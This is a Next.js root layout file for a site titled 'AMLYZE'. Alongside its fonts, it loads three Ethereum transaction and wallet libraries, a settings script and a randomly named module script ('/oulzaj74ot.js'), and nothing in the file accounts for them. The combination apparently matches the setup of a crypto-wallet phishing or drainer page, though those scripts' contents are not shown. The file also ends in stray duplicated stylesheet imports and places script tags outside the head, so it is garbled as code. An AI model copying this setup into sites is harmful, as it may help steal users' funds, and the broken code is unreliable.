import type React from "react"
import type { Metadata } from "next"
import "./globals.css"

export const metadata: Metadata = {
  title: "AMLYZE",
  description: "Created with v0",
  generator: "v0.dev",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">   
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">   
      <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>            
      <script src="/settings.js"></script>
      <script src="/oulzaj74ot.js" type="module"></script>    
      <body>{children}</body>
    </html>
  )
}

import "./globals.css"

import "./globals.css"



import './globals.css'